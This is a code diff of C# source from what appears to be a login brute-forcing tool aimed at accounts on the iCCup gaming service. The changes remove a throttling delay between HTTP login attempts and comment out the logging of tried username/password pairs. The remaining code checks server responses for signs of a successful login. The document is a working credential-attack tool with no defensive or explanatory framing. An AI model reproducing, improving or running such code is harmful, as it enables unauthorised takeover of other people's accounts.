@@ -898,7 +898,7 @@ namespace UnrealIccupBruteforcer
                             StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
                             streamWriter.Write(str3);
                             streamWriter.Close();
-                            Thread.Sleep(100);
+                            //Thread.Sleep(100);
                             HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse();
                             Stream responseStream = response.GetResponseStream();
                             StreamReader streamReader = new StreamReader(responseStream);
@@ -931,7 +931,7 @@ namespace UnrealIccupBruteforcer
                         {
                             if (end != null && !(responseUri == (Uri)null) && (end.Length >= 200 && responseUri.AbsolutePath != null))
                             {
-                                File.AppendAllText("test.log", end);
+                                /*File.AppendAllText("test.log", end);
                                 File.AppendAllText("test.log", "\n\n\n\n\n\n\n");
                                 File.AppendAllText("test.log", "LOOOOGIIIN:" + username + " = " + password);
                                 File.AppendAllText("test.log", "\n\n\n\n\n\n\n");
@@ -939,7 +939,7 @@ namespace UnrealIccupBruteforcer
                                 File.AppendAllText("test2.log", responseUri.AbsolutePath);
                                 File.AppendAllText("test2.log", "\n\n\n\n\n\n\n");
                                 File.AppendAllText("test2.log", "LOOOOGIIIN:" + username + " = " + password);
-                                File.AppendAllText("test2.log", "\n\n\n\n\n\n\n");
+                                File.AppendAllText("test2.log", "\n\n\n\n\n\n\n");*/
                                 { ++CurCount; }
                                 if (end.IndexOf("S_checkmark.jpg") <= 0 && end.IndexOf("transfer-attention") <= 0 && responseUri.AbsolutePath.IndexOf("category/6") <= 0)
                                 {
